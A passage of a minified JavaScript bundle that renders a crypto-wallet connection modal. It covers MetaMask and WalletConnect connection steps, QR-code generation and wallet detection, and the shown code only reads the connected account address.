147.532 63.3833 146.323C63.0581 145.25 62.6911 144.612 61.3694 144.435C57.6003 143.929 53.8602 143.192 50.1077 142.566C49.6157 142.484 49.1071 142.521 48.6026 142.501C48.9778 142.881 49.3238 143.303 49.7366 143.639C53.3807 146.638 57.988 146.534 62.2659 147.466V147.47ZM140.902 48.4547C140.602 47.4358 140.431 46.3259 139.963 45.3526C138.563 42.4329 137.079 39.5504 135.548 36.6927C135.177 36.0011 134.502 35.471 133.968 34.8623C133.86 35.9307 133.726 36.9951 133.668 38.0635C133.655 38.2872 133.955 38.5192 134.089 38.7594C135.936 42.0726 137.775 45.39 139.626 48.699C139.847 49.0924 140.143 49.4403 140.402 49.8131C140.552 49.399 140.702 48.9889 140.898 48.4505L140.902 48.4547ZM109.031 14.1215C109.101 13.8854 109.172 13.6493 109.247 13.4133C108.589 12.701 108.063 11.6655 107.246 11.3384C103.852 9.98408 100.375 8.8286 96.9099 7.6524C96.5347 7.52402 96.0469 7.73938 95.609 7.79322C95.8801 8.18666 96.0636 8.75819 96.4388 8.94042C100.233 10.771 104.048 12.5476 107.884 14.2913C108.18 14.4238 108.647 14.1877 109.031 14.1215ZM81.4537 148.113C86.553 147.693 90.1554 146.845 93.1032 145.234C93.391 145.076 93.6369 144.848 93.8996 144.653C93.5452 144.609 93.1825 144.497 92.8322 144.522C89.309 144.799 85.7816 145.073 82.2626 145.416C81.7039 145.47 81.0869 145.756 80.6657 146.124C80.1195 146.6 79.7443 147.268 79.2939 147.852L81.4496 148.113H81.4537ZM79.5609 12.3778C81.6372 12.4152 81.7039 12.3116 80.8075 10.3817C80.5781 9.88469 80.353 9.38356 80.0778 8.91557C79.5691 8.04999 79.0272 7.20513 78.4976 6.35197C78.0598 7.29209 77.5428 8.20737 77.2009 9.18477C76.1002 12.3116 76.1252 12.3199 79.5609 12.3778ZM60.4104 3.72625C57.938 4.13625 55.5864 4.38475 53.3141 4.94799C51.7422 5.33729 50.2703 6.13661 48.7735 6.80339C48.5358 6.91107 48.4149 7.28381 48.2439 7.5323C48.5066 7.52402 48.7776 7.55301 49.032 7.49917C52.8096 6.66258 56.587 5.83427 60.3563 4.95214C60.7607 4.85688 61.0943 4.46344 61.4611 4.21081C61.0901 4.041 60.7231 3.8712 60.4104 3.72625ZM74.4907 12.0963C74.891 11.7235 75.4914 11.4088 75.6999 10.9242C76.2169 9.72317 76.5629 8.45172 76.9507 7.20098C77.0257 6.96491 76.9716 6.69158 76.9757 6.43066C76.7256 6.49692 76.4338 6.49692 76.2336 6.63359C75.212 7.34593 74.178 8.04999 73.2149 8.83689C72.381 9.52023 71.6304 10.3113 70.8467 11.0526C71.9515 11.3674 73.0565 11.6821 74.4866 12.088L74.4907 12.0963ZM83.8261 12.6222C83.9388 12.5022 84.0555 12.3821 84.168 12.2619C84.5099 12.2371 84.8643 12.2495 85.1979 12.179C85.7107 12.0714 86.2111 11.9099 86.7156 11.7691C86.3946 11.3632 86.136 10.8828 85.7399 10.5722C84.2806 9.42912 82.7838 8.33161 81.2786 7.2424C80.9617 7.01461 80.5699 6.88622 80.2154 6.71228C80.3238 7.13886 80.3781 7.58614 80.5531 7.98373C80.9951 8.98598 81.3912 10.0296 81.9999 10.9283C82.4544 11.5993 83.2091 12.0673 83.8304 12.6264L83.8261 12.6222ZM145.363 63.0949C144.388 59.3634 143.357 55.3875 142.295 51.4158C142.178 50.981 141.878 50.5916 141.66 50.1817C141.461 50.6828 141.215 51.1756 141.077 51.6933C141.014 51.9294 141.144 52.2234 141.218 52.4803C142.315 56.1579 143.412 59.8355 144.525 63.509C144.596 63.741 144.83 63.9274 144.984 64.1303C145.067 63.8984 145.15 63.6665 145.359 63.0949H145.363ZM74.1656 6.35197C71.6972 7.27967 69.1205 8.23636 66.5604 9.23447C66.4395 9.28003 66.427 9.93024 66.4436 9.93438C67.5444 10.1622 68.912 10.8579 69.7084 10.4479C71.447 9.5575 72.9021 8.11211 74.4615 6.87794C74.5825 6.78269 74.6117 6.57561 74.6825 6.42238C74.5533 6.40581 74.424 6.3851 74.1697 6.35197H74.1656ZM2.32565 82.6553C2.37151 82.6553 2.4132 82.6553 2.45907 82.6553C2.45907 81.1395 2.53412 79.6196 2.42989 78.1079C2.37568 77.3252 2.03795 76.5508 1.77111 75.7929C1.69189 75.5692 1.42505 75.4118 1.24576 75.2254C1.15403 75.449 0.966403 75.6769 0.987251 75.888C1.32498 79.8681 1.67521 83.8481 2.0588 87.8198C2.08382 88.0973 2.37568 88.35 2.53829 88.615C2.57999 88.35 2.66337 88.0766 2.65087 87.8157C2.55497 86.097 2.43405 84.374 2.32149 82.6553H2.32565ZM88.7336 11.6283C89.1548 11.5371 89.4383 11.5123 89.6926 11.4129C90.1888 11.2183 90.6724 10.9863 91.1602 10.7668C90.7433 10.4645 90.364 10.0835 89.9011 9.8764C87.8247 8.95284 85.7233 8.07484 83.6261 7.1927C83.3884 7.0933 83.1173 7.06845 82.863 7.01047C82.9798 7.20926 83.0465 7.47018 83.2133 7.60271C84.7226 8.80375 86.2403 9.99237 87.7747 11.1561C88.0831 11.3881 88.4793 11.5082 88.7336 11.6283ZM48.9486 144.036C48.4233 143.635 48.1647 143.503 47.9896 143.3C45.6464 140.55 41.9522 140.856 39.0377 139.407C38.9378 139.356 38.7877 139.419 38.6584 139.427C38.7501 139.572 38.8085 139.796 38.9419 139.858C41.9356 141.262 44.9334 142.65 47.9355 144.025C48.1022 144.103 48.3399 144.033 48.9486 144.033V144.036ZM71.1427 5.98337C68.7452 6.44722 66.2435 6.91936 63.7502 7.42876C63.475 7.4826 63.2457 7.74766 62.9955 7.91332C63.1748 8.10798 63.3124 8.3896 63.5375 8.48071C64.0212 8.68365 64.6258 9.03153 65.0386 8.89486C67.1859 8.17009 69.2915 7.31281 71.4012 6.48864C71.5763 6.41823 71.7013 6.22358 71.8473 6.09105C71.6514 6.06206 71.4554 6.03308 71.1427 5.98751V5.98337ZM86.4029 6.79926C86.0527 6.85723 85.9234 6.87794 85.79 6.90279C85.9068 7.03118 85.9985 7.2134 86.1444 7.27967C88.1415 8.20323 90.1304 9.1475 92.161 9.99237C92.5154 10.1415 93.0824 9.93438 93.4868 9.74802C93.6202 9.6859 93.6161 8.91971 93.5452 8.899C91.1103 8.14939 88.6628 7.44947 86.4029 6.79926ZM62.5202 6.77026C64.9468 6.30227 67.115 5.88811 69.2872 5.46569C69.4165 5.44084 69.5333 5.37043 69.6583 5.32073C69.5207 5.25446 69.379 5.12193 69.2456 5.12608C67.0357 5.24618 64.8259 5.35386 62.6245 5.54437C62.341 5.56922 62.0908 6.01651 61.8281 6.26914C62.1157 6.47622 62.3993 6.68329 62.5244 6.77026H62.5202ZM88.3458 5.95852C88.1458 5.99994 87.8456 6.05792 87.5496 6.12004C87.8539 6.26914 88.1458 6.47207 88.471 6.56318C90.0721 7.02289 91.6731 7.47846 93.2909 7.87605C93.6786 7.97131 94.1247 7.83049 94.5459 7.8015C94.229 7.48675 93.9538 6.9732 93.5828 6.89451C91.8899 6.52591 90.1679 6.27328 88.3501 5.96267L88.3458 5.95852ZM79.6442 1.95782C78.556 1.86671 77.8096 1.76316 77.0592 1.75903C76.8006 1.75903 76.5421 1.99923 76.2794 2.13176C76.9424 2.6743 77.6054 3.21683 78.2641 3.76352C78.6268 3.29139 78.9855 2.81925 79.64 1.95782H79.6442ZM88.6085 4.57111C88.6044 4.60839 88.6002 4.64567 88.596 4.68294C88.1832 4.68294 87.7663 4.67052 87.3535 4.68707C87.0825 4.6995 86.8115 4.76163 86.5404 4.7989C86.7906 4.87758 87.0325 4.98941 87.2868 5.02668C88.7212 5.2379 90.1554 5.44083 91.5938 5.61892C91.8148 5.64791 92.0525 5.53608 92.2819 5.49053C92.0817 5.32487 91.8983 5.05982 91.6731 5.0184C90.6599 4.83203 89.6342 4.71193 88.6127 4.56697L88.6085 4.57111ZM83.4551 2.46722C82.5961 2.32227 81.9917 2.08206 81.4496 2.17318C80.9117 2.26429 80.4197 2.6743 79.9402 2.99319C79.8235 3.07188 79.8444 3.34937 79.7985 3.53159C80.3197 3.47361 80.8408 3.44876 81.3536 3.34937C81.8248 3.25825 82.2876 3.10915 82.7462 2.95178C82.9047 2.89794 83.034 2.75713 83.4551 2.45894V2.46722ZM63.7669 4.57526C65.4889 4.45929 66.9315 4.36818 68.3783 4.25635C68.5701 4.2398 68.7535 4.12797 68.9412 4.05756C68.7702 3.9913 68.5952 3.8712 68.4242 3.86705C66.9773 3.81736 65.5306 3.75524 64.0837 3.78422C63.7377 3.79251 63.3958 4.13212 63.0497 4.31848C63.3708 4.43444 63.6918 4.55041 63.771 4.57939L63.7669 4.57526ZM72.8855 1.71347C72.6145 1.78801 72.3018 1.87498 71.9932 1.96196C72.2642 2.14418 72.5144 2.37197 72.8063 2.50036C73.1857 2.66601 73.5902 2.79854 73.9946 2.86067C74.5324 2.9435 75.0828 2.9435 75.6248 2.98077C75.1411 2.61632 74.6909 2.18145 74.1572 1.90398C73.8112 1.72589 73.3483 1.77145 72.8855 1.70932V1.71347ZM68.7369 2.30156C68.7202 2.35126 68.7077 2.39681 68.691 2.44652C68.5534 2.43823 68.4116 2.39681 68.2825 2.42581C67.8905 2.50864 67.5069 2.62046 67.115 2.71985C67.4652 2.8234 67.8113 2.9435 68.1657 3.02633C68.3616 3.07188 68.5742 3.05531 68.7786 3.06775C69.7209 3.11744 70.6632 3.16714 71.6014 3.21683C70.6465 2.91451 69.6875 2.60804 68.7327 2.3057L68.7369 2.30156ZM62.3451 3.08431C62.7996 2.91451 63.3917 2.69086 63.9879 2.47137C63.7626 2.40096 63.5251 2.23944 63.3165 2.27258C62.4535 2.39681 61.5988 2.57905 60.7399 2.74056C61.2027 2.83995 61.6655 2.93935 62.3451 3.08845V3.08431ZM86.2528 3.90432C86.5404 3.84635 87.1617 3.7221 87.783 3.59785C87.0867 3.4819 86.3946 3.34108 85.6983 3.25825C85.4356 3.22512 85.1521 3.28724 84.8935 3.36179C84.6559 3.42806 84.4391 3.56058 84.2097 3.66412C84.4307 3.74281 84.6476 3.86705 84.8769 3.89605C85.2105 3.93746 85.5565 3.90432 86.2528 3.90432ZM145.638 67.5347C145.584 67.427 145.526 67.3193 145.472 67.2075C145.422 67.3069 145.313 67.4228 145.33 67.5098C145.359 67.6465 145.472 67.7624 145.547 67.8866C145.576 67.7708 145.605 67.6548 145.638 67.5347Z"
                fill="#3385FF" />
                </svg>

           
            <div class="flex flex-col justify-center items-center gap-6">
              <div class="flex flex-col justify-center items-center gap-4">
                <p class="font-semibold  dark:text-white text-black">Your gateway to the decentralized world</p>
                <p class="font-medium   text-secondary">Connect a wallet to get started</p>
              </div>
              <a href="">New to wallets?</a>
            </div>

          </div>
        </div>
        <div id="connection_failed_step" class="  w-full h-full hidden justify-center items-center flex-col ">
          <div class="grid w-full p-6 items-center grid-cols-3">
            <div
            class="return_default_step hover:dark:bg-black/5 hover:bg-gray-100 rounded-lg w-fit px-3  cursor-pointer transition-all duration-300 p-2">
              <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" clip-rule="evenodd"
                  d="M8.14696 1.01618C8.46928 1.31837 8.48562 1.82462 8.18344 2.14696L2.69639 7.99981L8.18344 13.8526C8.48562 14.175 8.46928 14.6812 8.14696 14.9835C7.82462 15.2856 7.31835 15.2692 7.01618 14.947L1.01618 8.54696C0.727681 8.23923 0.727681 7.76038 1.01618 7.45266L7.01618 1.05266C7.31835 0.730319 7.82462 0.713999 8.14696 1.01618Z"
                  fill="#7C7A85" />
              </svg>

            </div>
            <div id="wallet_selected_name" class="text-center dark:text-white text-black text-xl font-semibold">MetaMask</div>
          </div>
          <div class="flex flex-col h-full justify-center items-center w-full gap-10">

            <div class="border-dashed border-[#0066FF] ">
              <div class="bg-[#1B1C22] dark:border dark:border-[#262830] rounded-2xl p-2.5">
                <img src="./assets/modal1and2/metamask.png" alt="" srcset="" class="image_connected_wallet w-16 h-16">
              </div>
            </div>

            <div class="flex flex-col w-full justify-center items-center gap-4">
              <p class="font-semibold  dark:text-white text-black text-xl">Connection failed</p>
              <button class="btn btn-primary text-sm w-full">
                <svg width="15" height="16" viewBox="0 0 15 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path fill-rule="evenodd" clip-rule="evenodd"
                    d="M1.88357 8.00008C1.88357 4.97565 4.2407 1.97341 7.91023 1.97341C10.8738 1.97341 12.3385 4.16692 12.9627 5.33343H11.1103C10.8157 5.33343 10.5769 5.57221 10.5769 5.86676C10.5769 6.16131 10.8157 6.4001 11.1103 6.4001H14.3103C14.6048 6.4001 14.8436 6.16131 14.8436 5.86676V2.66676C14.8436 2.37221 14.6048 2.13343 14.3103 2.13343C14.0157 2.13343 13.7769 2.37221 13.7769 2.66676V4.60082C13.0255 3.27611 11.2872 0.906738 7.91023 0.906738C3.57656 0.906738 0.816895 4.46449 0.816895 8.00008C0.816895 11.5357 3.57656 15.0934 7.91023 15.0934C9.98366 15.0934 11.7099 14.273 12.9391 13.0224C13.5972 12.3527 14.1111 11.5617 14.4615 10.7102C14.5736 10.4378 14.4437 10.1261 14.1714 10.014C13.8989 9.90192 13.5873 10.0319 13.4752 10.3042C13.1756 11.0321 12.737 11.7062 12.1783 12.2747C11.1417 13.3295 9.6863 14.0268 7.91023 14.0268C4.2407 14.0268 1.88357 11.0245 1.88357 8.00008Z"
                    fill="#EEEEF0" />
                </svg>
                Try Again
              </button>
            </div>



        </div>
        <div class="py-6 w-full flex justify-center items-center border-t border-[#DBD8E0] dark:border-[#262830]">
          <a href="" class="wallet-link_info text-sm">Don't have ?</a>
        </div>
      </div>
      <div id="additional_info_step" class="w-full h-full hidden justify-center items-center flex-col ">
        <div class="grid w-full p-6 items-center grid-cols-3">
          <div
            class="return_default_step hover:dark:bg-black/5 hover:bg-gray-100 rounded-lg w-fit px-3  cursor-pointer transition-all duration-300 p-2">
            <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path fill-rule="evenodd" clip-rule="evenodd"
                d="M8.14696 1.01618C8.46928 1.31837 8.48562 1.82462 8.18344 2.14696L2.69639 7.99981L8.18344 13.8526C8.48562 14.175 8.46928 14.6812 8.14696 14.9835C7.82462 15.2856 7.31835 15.2692 7.01618 14.947L1.01618 8.54696C0.727681 8.23923 0.727681 7.76038 1.01618 7.45266L7.01618 1.05266C7.31835 0.730319 7.82462 0.713999 8.14696 1.01618Z"
                fill="#7C7A85" />
            </svg>

          </div>
          <div id="wallet_selected_name" class="text-center dark:text-white text-black text-xl font-semibold">MetaMask</div>
        </div>
        <div class="flex flex-col h-full justify-center items-center w-full gap-10">

          <div id="additional_info_image" class="">
            <div class="bg-[#1B1C22] dark:border dark:border-[#262830] rounded-2xl p-2.5">
              <img src="./assets/modal1and2/metamask.png" alt="" srcset="" class="image_connected_wallet w-16 h-16">
            </div>
          </div>

          <div class="flex flex-col w-full justify-center items-center gap-4">
            <p id="additional_info_title" class="font-semibold  dark:text-white text-black text-xl">Awaiting Confirmation</p>
            <p id="additional_info_description" class="max-w-[180px] text-center text-[#7C7A85]">Accept the connection
              request in MetaMask</p>
            <button id="additional_info_btn" class="close_modal btn btn-primary !hidden">

                <svg width="15" height="15" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" clip-rule="evenodd" d="M1.88357 7.50008C1.88357 4.47565 4.2407 1.47341 7.91023 1.47341C10.8738 1.47341 12.3385 3.66692 12.9627 4.83343H11.1103C10.8157 4.83343 10.5769 5.07221 10.5769 5.36676C10.5769 5.66131 10.8157 5.9001 11.1103 5.9001H14.3103C14.6048 5.9001 14.8436 5.66131 14.8436 5.36676V2.16676C14.8436 1.87221 14.6048 1.63343 14.3103 1.63343C14.0157 1.63343 13.7769 1.87221 13.7769 2.16676V4.10082C13.0255 2.77611 11.2872 0.406738 7.91023 0.406738C3.57656 0.406738 0.816895 3.96449 0.816895 7.50008C0.816895 11.0357 3.57656 14.5934 7.91023 14.5934C9.98366 14.5934 11.7099 13.773 12.9391 12.5224C13.5972 11.8527 14.1111 11.0617 14.4615 10.2102C14.5736 9.93782 14.4437 9.62612 14.1714 9.51403C13.8989 9.40192 13.5873 9.53186 13.4752 9.80425C13.1756 10.5321 12.737 11.2062 12.1783 11.7747C11.1417 12.8295 9.6863 13.5268 7.91023 13.5268C4.2407 13.5268 1.88357 10.5245 1.88357 7.50008Z" fill="white"/>
                </svg>
      
                Try Again
          </button>
          </div>
      



          </div>
          <div class="py-6 w-full flex justify-center items-center border-t border-[#DBD8E0] dark:border-[#262830]">
            <a href="" class="text-sm wallet-link_info">Don't have MetaMask?</a>
          </div>
        </div>
        <div id="awaiting_confirmation_step" class="  w-full h-full hidden justify-center items-center flex-col ">
          <div class="grid w-full p-6 items-center grid-cols-3">
            <div
            class="return_default_step hover:dark:bg-black/5 hover:bg-gray-100 rounded-lg w-fit px-3  cursor-pointer transition-all duration-300 p-2">
              <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" clip-rule="evenodd"
                  d="M8.14696 1.01618C8.46928 1.31837 8.48562 1.82462 8.18344 2.14696L2.69639 7.99981L8.18344 13.8526C8.48562 14.175 8.46928 14.6812 8.14696 14.9835C7.82462 15.2856 7.31835 15.2692 7.01618 14.947L1.01618 8.54696C0.727681 8.23923 0.727681 7.76038 1.01618 7.45266L7.01618 1.05266C7.31835 0.730319 7.82462 0.713999 8.14696 1.01618Z"
                  fill="#7C7A85" />
              </svg>

            </div>
            <div id="wallet_selected_name" class="text-center dark:text-white text-black text-xl font-semibold">MetaMask</div>
          </div>
          <div class="flex flex-col h-full justify-center items-center w-full gap-10">

            <div class="lines-primary ">
              <div class="bg-[#1B1C22] dark:border dark:border-[#262830] rounded-2xl p-2.5">
                <img src="./assets/modal1and2/metamask.png" alt="" srcset="" class="image_connected_wallet w-16 h-16">
              </div>
            </div>

            <div class="flex flex-col w-full justify-center items-center gap-4">
              <p class="font-semibold  dark:text-white text-black text-xl">Awaiting Confirmation</p>
              <p class="max-w-[180px] text-center text-[#7C7A85]">Accept the connection
                request in MetaMask</p>
            </div>



          </div>
          <div class="py-6 w-full flex justify-center items-center border-t border-[#DBD8E0] dark:border-[#262830]">
            <a href="" class="text-sm wallet-link_info">Don't have MetaMask?</a>
          </div>
        </div>
            <div id="walletConnect_step" class="w-full h-full hidden justify-center items-center flex-col">
            <div class="grid w-full p-6 items-center grid-cols-3">
              <div class="return_default_step hover:dark:bg-black/5 hover:bg-gray-100 rounded-lg w-fit px-3 cursor-pointer transition-all duration-300 p-2">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path fill-rule="evenodd" clip-rule="evenodd" d="M8.14696 1.01618C8.46928 1.31837 8.48562 1.82462 8.18344 2.14696L2.69639 7.99981L8.18344 13.8526C8.48562 14.175 8.46928 14.6812 8.14696 14.9835C7.82462 15.2856 7.31835 15.2692 7.01618 14.947L1.01618 8.54696C0.727681 8.23923 0.727681 7.76038 1.01618 7.45266L7.01618 1.05266C7.31835 0.730319 7.82462 0.713999 8.14696 1.01618Z" fill="#7C7A85" />
                </svg>
              </div>
              <div id="wallet_selected_name" class="text-center dark:text-white text-black text-xl font-semibold">WalletConnect</div>
            </div>
            <div class="flex flex-col h-full justify-center items-center w-full gap-6">
             
              <div id="walletConnect_step_content" class="flex flex-col w-full justify-center items-center gap-4">
                  <span class="loader"></span>
              </div>
            </div>
            <div class="py-6 w-full flex justify-center items-center border-t border-[#DBD8E0] dark:border-[#262830]">
              <a href="https://walletconnect.com/explorer" target="_blank" class="text-sm">Learn more about WalletConnect</a>
            </div>
      </div>
      <div id="awaiting_success_step" class="  w-full h-full hidden justify-center items-center flex-col ">
          <div class="grid w-full p-6 items-center grid-cols-3">
            <div
            class="return_default_step hover:dark:bg-black/5 hover:bg-gray-100 rounded-lg w-fit px-3  cursor-pointer transition-all duration-300 p-2">
              <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path fill-rule="evenodd" clip-rule="evenodd"
                  d="M8.14696 1.01618C8.46928 1.31837 8.48562 1.82462 8.18344 2.14696L2.69639 7.99981L8.18344 13.8526C8.48562 14.175 8.46928 14.6812 8.14696 14.9835C7.82462 15.2856 7.31835 15.2692 7.01618 14.947L1.01618 8.54696C0.727681 8.23923 0.727681 7.76038 1.01618 7.45266L7.01618 1.05266C7.31835 0.730319 7.82462 0.713999 8.14696 1.01618Z"
                  fill="#7C7A85" />
              </svg>

            </div>
            <div id="wallet_selected_name" class="text-center dark:text-white text-black text-xl font-semibold">MetaMask</div>
          </div>
          <div class="flex flex-col h-full justify-center items-center w-full gap-10">

            <div class="lines-success ">
              <div class="bg-[#1B1C22] dark:border dark:border-[#262830] rounded-2xl p-2.5">
                <img src="./assets/modal1and2/metamask.png" alt="" srcset="" class="image_connected_wallet w-16 h-16">
              </div>
            </div>

            <div class="flex justify-center items-center flex-col gap-3">
              <svg width="27" height="26" viewBox="0 0 27 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="0.5" width="26" height="26" rx="13" fill="#1EFF00" />
                <path d="M8.5144 12.5L11.6526 16.5L18.4856 9.5" stroke="white" stroke-width="3" stroke-linecap="round"
                  stroke-linejoin="round" />
              </svg>


              <div class="flex flex-col w-full justify-center items-center gap-1">

                <p class="font-semibold  dark:text-white text-black text-xl">Connected</p>
                <p class="max-w-[180px] text-center text-[#7C7A85]">Successfully Connected</p>
              </div>
            </div>



          </div>
          <div class="py-6 w-full flex justify-center items-center border-t border-[#DBD8E0] dark:border-[#262830]">
            <a href="" class="text-sm wallet-link_info">Don't have MetaMask?</a>
          </div>
        </div>
      </div>
    </div>

  </div>`,n.querySelector("#wallet-list-container").appendChild(Zie(Gie())),n.querySelectorAll(".return_default_step").forEach(o=>{o.addEventListener("click",()=>{i0(),LO(),Qie()})}),n.querySelectorAll(".close_modal").forEach(o=>{o.addEventListener("click",()=>{iE()})}),Wr.appendChild(n)}function jO(){i0(),jYe();const r=Wr.querySelector("#additional_info_step");r?(r.style.display="flex",Jie()):console.error("Content modal step not found")}function qYe(r){UO("loading",r),jO()}function zYe(r){UO("confirm",r),jO()}function WYe(r){UO("error",r),jO()}function HYe(r){i0();const e=Wr.querySelector("#walletConnect_step");if(e){Wr.querySelectorAll("#wallet_selected_name").forEach(i=>{i.textContent=r.name}),Wr.querySelectorAll(".wallet-link_info").forEach(i=>{switch(r.name){case"MetaMask":i.href="https://metamask.io/",i.target="_blank",i.textContent="Don't have MetaMask?";break;case"Coinbase Wallet":i.href="https://www.coinbase.com/wallet",i.target="_blank",i.textContent="Don't have Coinbase Wallet?";break;case"Phantom":i.href="https://phantom.app/",i.target="_blank",i.textContent="Don't have Phantom?";break;case"Rabby Wallet":i.href="https://rabby.io/",i.target="_blank",i.textContent="Don't have Rabby Wallet?";break;case"Trust Wallet":i.href="https://trustwallet.com/",i.target="_blank",i.textContent="Don't have Trust Wallet?";break;default:i.href="https://metamask.io/",i.target="_blank",i.textContent="Don't have Wallet?"}}),Wr.querySelectorAll(".image_connected_wallet").forEach(i=>{i.src=r.icon});const t=e.querySelector("#walletConnect_step_content");t.innerHTML=`
      <p class="font-semibold dark:text-white text-black text-xl">Scan QR-code</p>
      <div id="qrcode-container" class="mt-4 mb-4 p-2 bg-black/5 dark:bg-white/10 rounded-lg" style="max-width: 216px; min-height: 216px; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;">
        <div id="qrcode"></div>
      </div>
      <p style="max-width: 320px;" class="  text-center text-[#7C7A85]">Open a compatible WalletConnect wallet and scan the QR-code</p>
    `,e.style.display="flex"}else console.error("WalletConnect step element not found")}async function VYe(r,e,t,i){try{const n=await q3.init({projectId:e,optionalChains:t,showQrModal:!1});n.on("display_uri",s=>{const o=Wr.querySelector("#qrcode");if(o){o.innerHTML="";try{const a=document.createElement("div");a.className="styled-qr-container",a.style.cssText=`
            border-radius: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            margin: 0 auto;
          `,a.style.animation="qrFadeIn 0.6s ease forwards",z3.toDataURL(s,{width:200,margin:0,color:{dark:"#ffffff",light:"#1a1c24"},errorCorrectionLevel:"H"}).then(c=>{const l=document.createElement("div");l.style.cssText=`
              position: relative;
              overflow: hidden;
            `;const u=document.createElement("img");u.src=c,u.width=200,u.height=200,u.style.cssText=`
              border-radius: 8px;
              display: block;
              filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
            `;const d=document.createElement("div");d.style.cssText=`
              position: absolute;
              top: 50%;
              left: 50%;
              transform: translate(-50%, -50%);
              width: 40px;
              height: 40px;
              background: white;
              border-radius: 50%;
              display: flex;
              align-items: center;
              justify-content: center;
              box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
            `;const h=document.createElement("img");h.src=r.info.icon,h.style.cssText=`
              width: 30px;
              height: 30px;
              border-radius: 50%;
              object-fit: contain;
            `;const f=document.createElement("div");if(f.style.cssText=`
              position: absolute;
              bottom: -10px;
              left: 0;
              right: 0;
              text-align: center;
              font-size: 14px;
              font-weight: 500;
              color: white;
              text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
              transform: translateY(-50%);
            `,d.appendChild(h),l.appendChild(u),l.appendChild(d),a.appendChild(l),a.appendChild(f),o.appendChild(a),!document.getElementById("qr-animations")){const p=document.createElement("style");p.id="qr-animations",p.textContent=`
                @keyframes qrFadeIn {
                  from { opacity: 0; transform: scale(0.9); }
                  to { opacity: 1; transform: scale(1); }
                }
                @keyframes qrPulse {
                  0% { transform: scale(1); }
                  50% { transform: scale(1.05); }
                  100% { transform: scale(1); }
                }
                .styled-qr-container:hover {
                  animation: qrPulse 1.5s infinite;
                }
              `,document.head.appendChild(p)}}).catch(c=>{console.error("Error generating QR-code (URL):",c),o.innerHTML=`
              <div style="color: #ff4d4d; text-align: center; padding: 20px; background: rgba(255, 77, 77, 0.1); border-radius: 8px;">
                <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" y1="8" x2="12" y2="12"></line>
                  <line x1="12" y1="16" x2="12.01" y2="16"></line>
                </svg>
                <p style="margin-top: 10px; font-weight: 500;">  QR-</p>
              </div>
            `})}catch(a){console.error("Error generating QR-code:",a),o.innerHTML=`
            <div style="word-break: break-all; font-size: 12px; padding: 10px; text-align: center;">
              <p>QR-code not generated. Use URI:</p>
              <code style="background: #f0f0f0; padding: 5px; display: block; margin-top: 10px;">${s}</code>
            </div>
          `}}}),n.on("connect",()=>{n.request({method:"eth_accounts"}).then(s=>{s&&s.length>0&&(i0(),Yie(),setTimeout(()=>{iE(),i({provider:n,walletAddress:s[0],name:r.info.name})},1500))}).catch(s=>{console.error("Failed to get accounts:",s),i0(),tP()})}),await n.connect()}catch(n){console.error("WalletConnect initialization error:",n),i0(),tP()}}async function KYe(){try{const r=await fetch("assets/styles1.css");if(!r.ok)throw new Error("    ");return await r.text()}catch(r){console.error("   :",r)}}const GYe=Object.freeze(Object.defineProperty({__proto__:null,disconnectWallet:UYe,hideModal:iE,initModal:FYe,openModal:Jie,showConfirmModal:zYe,showErrorModal:WYe,showLoadingModal:qYe},Symbol.toStringTag,{value:"Module"})),Xie=document.createElement("div");document.body.appendChild(Xie);const ene=Xie.attachShadow({mode:"open"}),si=document.createElement("html");document.head.append(Object.assign(document.createElement("link"),{rel:"stylesheet",href:"https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"}));ene.appendChild(si);function tne(){const r=B3();r.reset();const e=r.getProviders();if((!e||e.length===0)&&window.ethereum){let t="Injected Wallet",i="./assets/modal1and2/metamask.png";window.ethereum.isMetaMask?t="MetaMask":window.ethereum.isCoinbaseWallet?t="Coinbase Wallet":window.ethereum.isPhantom&&(t="Phantom"),e.push({info:{name:t,icon:i,walletId:"injected",uuid:""},provider:window.ethereum})}return e.push({info:{name:"WalletConnect",icon:"./assets/modal1and2/wallet_connect.png",walletId:"walletconnect",uuid:""},provider:null}),e}function rne(r){const e=document.createElement("div");return e.className="grid grid-cols-2 gap-2",[...r].sort((n,s)=>n.info.name==="MetaMask"?-1:s.info.name==="MetaMask"?1:n.info.name==="Rabby Wallet"?-1:s.info.name==="Rabby Wallet"||n.info.walletId==="walletconnect"?1:s.info.walletId==="walletconnect"?-1:n.info.name.localeCompare(s.info.name)).slice(0,6).forEach(n=>{const s=document.createElement("div");s.className="wallet-link",s.dataset.walletId=n.info.walletId,s.dataset.walletName=n.info.name,s.dataset.walletIcon=n.info.icon,s.dataset.providerIndex=r.findIndex(o=>o.info.name===n.info.name&&o.info.walletId===n.info.walletId),s.innerHTML=`
      <div class="p-2.5 rounded-2xl border border-[#D0D4F7] dark:border-[#262830] h-full justify-center items-center flex">
        <img src="${n.info.icon}" alt="${n.info.name}" style="max-width: 32px; max-height: 32px;" class="max-w-8 max-h-8">
      </div>
      <p>${n.info.name}</p>
